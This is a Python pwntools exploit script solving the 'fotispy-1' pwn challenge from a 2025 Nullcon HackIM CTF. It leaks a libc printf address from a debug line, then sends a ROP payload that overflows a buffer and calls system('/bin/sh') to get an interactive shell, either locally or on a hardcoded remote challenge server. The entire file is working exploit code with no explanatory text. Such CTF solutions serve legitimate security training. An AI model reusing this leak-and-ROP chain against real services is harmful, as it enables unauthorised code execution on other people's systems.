#!/usr/bin/env python3
import sys

from pwn import *

BINARY_PATH = "/ctf-writeups/2025/nullcon-berlin-hackim-ctf/pwn/fotispy-1/dist/fotispy1"
LIBC_PATH = "/usr/lib/x86_64-linux-gnu/libc.so.6"
REMOTE_HOST = "52.59.124.14"
REMOTE_PORT = 5191

context.binary = BINARY_PATH
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

elf = context.binary
libc = ELF(LIBC_PATH)

is_remote = len(sys.argv) == 2 and sys.argv[1] == "remote"


def attach(r):
    if is_remote:
        return

    bkps = []
    gdb.attach(r, "\n".join(f"break {x}" for x in bkps))


def register(r, username, password):
    r.sendlineafter(b": ", b"0")
    r.sendlineafter(b": ", username)
    r.sendlineafter(b": ", password)


def login(r, username, password):
    r.sendlineafter(b": ", b"1")
    r.sendlineafter(b": ", username)
    r.sendlineafter(b": ", password)


def build_rop():
    rop = ROP(libc)
    rop.raw(b"A" * 0xd)
    rop.raw(p64(elf.bss(0x800)))
    rop.raw(b"A" * 8)
    rop.raw(rop.ret)
    rop.call(libc.sym.system, [next(libc.search(b"/bin/sh\0"))])
    return rop.chain()


def add_song(r, title, singer):
    r.sendlineafter(b": ", b"2")

    r.recvuntil(b"[DEBUG] ")
    printf = int(r.recvline().strip().decode(), 16)
    libc.address = printf - libc.sym.printf
    payload = build_rop()

    r.sendlineafter(b": ", title)
    r.sendlineafter(b": ", singer)
    r.sendlineafter(b": ", payload)


def display(r):
    r.sendlineafter(b": ", b"3")


def exploit(r):
    attach(r)

    register(r, b"A", b"A")
    login(r, b"A", b"A")
    add_song(r, b"A", b"A")
    display(r)

    r.interactive()


def main():
    if is_remote:
        r = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        r = process(elf.path)

    exploit(r)


if __name__ == "__main__":
    main()
